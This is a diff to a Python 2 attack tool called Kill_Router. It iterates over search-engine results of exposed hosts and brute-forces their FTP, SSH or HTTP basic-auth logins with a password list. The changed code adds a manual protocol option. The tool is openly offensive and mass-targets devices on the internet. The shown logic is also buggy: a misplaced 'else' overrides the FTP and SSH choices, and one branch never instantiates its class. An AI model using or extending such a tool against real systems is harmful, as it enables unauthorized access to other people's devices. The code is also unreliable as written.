@@ -25,28 +25,48 @@ class Kill_Router(object):
             if response == "Y":
 
                 parser = Passlist(args.passlist)
-                passwords = parser.get_list()
 
                 for result in results['matches']:
 
+                    passwords = parser.get_list()
+
                     try:
 
-                        method = "http"
-                        Attack = Basic_Auth()
+                        if args.method is None:
 
-                        if result['port'] == 21:
-                            method = "ftp"
-                            Attack = FTP()
+                            if result['port'] == 21:
+                                method = "ftp"
+                                Attack = FTP()
 
-                        if result['port'] == 22:
-                            method = "ftp"
-                            Attack = SSH()
+                            if result['port'] == 22:
+                                method = "ssh"
+                                Attack = SSH()
 
-                        if result['port'] == 443:
-                            method = "https"
-                            Attack = Basic_Auth()
+                            if result['port'] == 443:
+                                method = "https"
+                                Attack = Basic_Auth()
 
-                        print method
+                            else:
+                                args.method = "http"
+                                Attack = Basic_Auth()
+
+                        else:
+
+                            if args.method == "http":
+                                method = "http"
+                                Attack = Basic_Auth()
+
+                            if args.method == "https":
+                                method = "https"
+                                Attack = Basic_Auth
+
+                            if args.method == "ftp":
+                                method = "ftp"
+                                Attack = FTP()
+
+                            if args.method == "ssh":
+                                method = "ssh"
+                                Attack = SSH()
 
                         Attack.brute_force(result['ip_str'], result['port'], args.username, passwords, method)
 
